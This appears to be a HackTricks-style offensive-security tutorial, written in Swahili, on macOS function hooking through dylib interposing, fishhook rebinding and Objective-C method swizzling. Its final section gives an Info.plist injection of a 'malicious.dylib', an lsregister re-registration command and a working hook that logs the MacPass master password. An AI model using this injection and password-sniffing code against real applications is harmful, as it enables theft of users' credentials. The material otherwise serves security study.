# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Unda **dylib** yenye sehemu ya **`__interpose` (`__DATA___interpose`)** (au sehemu iliyo na flag ya **`S_INTERPOSING`**) inayojumuisha tuples za **function pointers** zinazoelekeza kwenye functions za **original** na **replacement**.

Kisha, **inject** dylib hiyo kwa kutumia **`DYLD_INSERT_LIBRARIES`** (interposing inapaswa kufanyika kabla ya main app kupakia). Bila shaka, [**restrictions** zinazotumika kwenye matumizi ya **`DYLD_INSERT_LIBRARIES`** zinatumika pia hapa](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable inaweza kutumika kufanya debug ya interposing na itaonyesha mchakato wa interpose.

Pia kumbuka kuwa **interposing hutokea kati ya process na libraries zilizopakiwa**, na haifanyi kazi na shared library cache.

### Dynamic Interposing

Sasa pia inawezekana kufanya interpose ya function dynamically kwa kutumia function **`dyld_dynamic_interpose`**. Hii inaruhusu kufanya interpose ya function **programmatically** wakati wa **runtime**, badala ya kuifanya tu tangu **mwanzo**.

Kinachohitajika tu ni kubainisha **tuples** za **function itakayobadilishwa na function ya replacement**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Ikiwa tayari una uwezo wa kutekeleza code **ndani ya process** na unataka ku-hook **imported C function** bila kuanzisha upya target, primitive inayotumika sana ni **symbol rebinding** (iliyopewa umaarufu na **`fishhook`**).

Badala ya kutumia section ya **`__interpose`**, technique hii hupitia metadata ya Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) na **huandika upya import slot** inayotumiwa na image ya sasa. Hii ni muhimu sana kwa ku-hook functions katika process **ambayo tayari inaendelea** au ku-hook **image moja tu** kwa kutumia **`rebind_symbols_image`**.<sup>[[2]](#references)</sup>

> [!TIP]
> Hii huathiri tu calls zinazopitia **import pointer**. Ikiwa target function inaitwa moja kwa moja ndani ya image hiyo hiyo, hakuna imported slot ya kuandika upya, kwa hivyo technique hii haitaona call site hiyo.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Katika matoleo ya hivi karibuni ya macOS, targets nyingi za rebinding hazipo tena kwenye pages za **`__DATA`** zinazoweza kuandikwa. Kwa kawaida, rebinders huhitaji kufanya **`__DATA_CONST`** iweze kuandikwa kwa muda kabla ya kurekebisha pointer. Zaidi ya hayo, kwenye Apple Silicon / **`arm64e`** unapaswa kutarajia pointers zilizothibitishwa na indirection ya ziada katika **`__AUTH_CONST.__auth_got`**, hivyo rebinder inayochanganua tu sections za kawaida za lazy/non-lazy symbol pointer inaweza kukosa baadhi ya call sites.<sup>[[3]](#references)</sup>

> [!CAUTION]
> ABI ya **`arm64e`** hutumia **Pointer Authentication (PAC)** kwa function pointers nyingi. Kuandika pointers moja kwa moja, ambako hapo awali kulifanya kazi kwenye Intel, kunaweza kuharibu call site kwenye Apple Silicon. Unapoandika rebinder au inline hooker yako mwenyewe, uwe tayari kutumia helpers za **`<ptrauth.h>`** kama vile **`ptrauth_sign_unauthenticated`** au **`ptrauth_auth_and_resign`**, na ufanye majaribio mahsusi kwenye targets za **`arm64e`**.

Kwa maelezo zaidi kuhusu **`__AUTH`**, **`__AUTH_CONST`** na **`__auth_got`**, angalia [ukurasa huu](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

Katika ObjectiveC, hivi ndivyo method inavyoitwa: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Inahitajika **object**, **method** na **params**. Method inapoitwa, **msg hutumwa** kwa kutumia function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object ni **`someObject`**, method ni **`@selector(method1p1:p2:)`**, na arguments ni **`value1`**, **`value2`**.

Kwa kufuata object structures, inawezekana kufikia **array ya methods** ambako **names** na **pointers** zinazoelekeza kwenye method code **zimewekwa**.

> [!CAUTION]
> Kumbuka kwamba kwa kuwa methods na classes hufikiwa kwa kutumia names zao, taarifa hii huhifadhiwa kwenye binary; hivyo inawezekana kuipata kwa `otool -ov </path/bin>` au [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Kufikia methods ghafi

Inawezekana kufikia taarifa za methods kama vile name, idadi ya params au address, kama katika mfano ufuatao:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Function **`method_exchangeImplementations`** inaruhusu **kubadilisha** **anwani** ya **utekelezaji** wa **function moja na nyingine**.

> [!CAUTION]
> Kwa hiyo function inapoitwa, **inayotekelezwa ni nyingine**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Katika hali hii, ikiwa **implementation code ya legit** method **verifies** **method** **name**, inaweza **detect** swizzling hii na kuizuia isitekelezwe.
>
> Technique ifuatayo haina kizuizi hiki.

### Method Swizzling with method_setImplementation

Muundo wa awali ni wa ajabu kwa sababu unabadilisha implementation ya methods 2, moja kwa nyingine. Kwa kutumia function **`method_setImplementation`**, unaweza **kubadilisha** **implementation** ya **method moja kwa nyingine**.

Kumbuka tu **kuhifadhi anwani ya implementation ya ile ya awali** ikiwa utaiita kutoka kwenye implementation mpya kabla ya kuibadilisha, kwa sababu baadaye itakuwa vigumu zaidi kupata anwani hiyo.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Katika ukurasa huu, njia tofauti za kufanya hook kwenye functions zilijadiliwa. Hata hivyo, zilihusisha **kuendesha code ndani ya process inayolengwa**.

Ili kufanya hivyo, technique rahisi zaidi ni ku-inject [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Hata hivyo, nadhani hili pia linaweza kufanywa kupitia [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Hata hivyo, chaguo zote mbili **zina mipaka** kwa binaries/processes **zisizolindwa**. Angalia kila technique ili kujifunza zaidi kuhusu limitations zake.

Hata hivyo, function hooking attack ni maalum sana; attacker atafanya hivi ili **kuiba taarifa nyeti kutoka ndani ya process** (ikiwa sivyo, ungefanya tu process injection attack). Na taarifa hii nyeti inaweza kuwa katika Apps ambazo user amedownload, kama vile MacPass.

Kwa hivyo, attack vector itakuwa ama kutafuta vulnerability au kuondoa signature ya application, kisha ku-inject **`DYLD_INSERT_LIBRARIES`** env variable kupitia Info.plist ya application kwa kuongeza kitu kama:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
na kisha **jisajili tena** application:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Ongeza kwenye library hiyo hooking code ya ku-exfiltrate taarifa: Passwords, messages...

> [!CAUTION]
> Kumbuka kwamba katika matoleo mapya ya macOS, ukiondoa **signature** ya application binary na ikiwa iliwahi kutekelezwa hapo awali, macOS **haitatekeleza application hiyo** tena.

#### Mfano wa library
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Marejeleo

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Maktaba inayorahisisha mchakato wa kubadilisha upya symbols katika Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Nyaraka za Clang](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
